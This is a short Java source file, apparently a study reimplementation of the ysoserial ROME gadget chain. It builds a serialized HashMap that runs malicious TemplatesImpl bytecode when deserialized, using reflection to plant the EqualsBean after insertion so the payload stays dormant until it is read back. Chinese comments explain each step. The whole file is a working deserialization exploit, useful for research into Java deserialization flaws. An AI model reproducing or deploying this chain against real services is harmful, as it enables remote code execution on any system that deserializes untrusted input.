package org.su18.serialize.ysoserial.Rome;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import org.su18.serialize.utils.SerializeUtil;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.util.HashMap;

/**
 * @author su18
 */
public class Rome {

	public static void main(String[] args) throws Exception {

		// 生成包含恶意类字节码的 TemplatesImpl 类
		TemplatesImpl tmpl = SerializeUtil.generateTemplatesImpl();

		// 使用 TemplatesImpl 初始化被包装类，使其 ToStringBean 也使用 TemplatesImpl 初始化
		ObjectBean delegate = new ObjectBean(Templates.class, tmpl);

		// 使用 ObjectBean 封装这个类，使其在调用 hashCode 时会调用 ObjectBean 的 toString
		// 先封装一个无害的类
		ObjectBean root = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, "su18"));

		// 放入 Map 中
		HashMap<Object, Object> map = new HashMap<>();
		map.put(root, "su18");
		map.put("su19", "su20");

		// put 到 map 之后再反射写进去，避免触发漏洞
		Field field = ObjectBean.class.getDeclaredField("_equalsBean");
		field.setAccessible(true);
		field.set(root, new EqualsBean(ObjectBean.class, delegate));

		SerializeUtil.writeObjectToFile(map);
		SerializeUtil.readFileObject();
	}

}
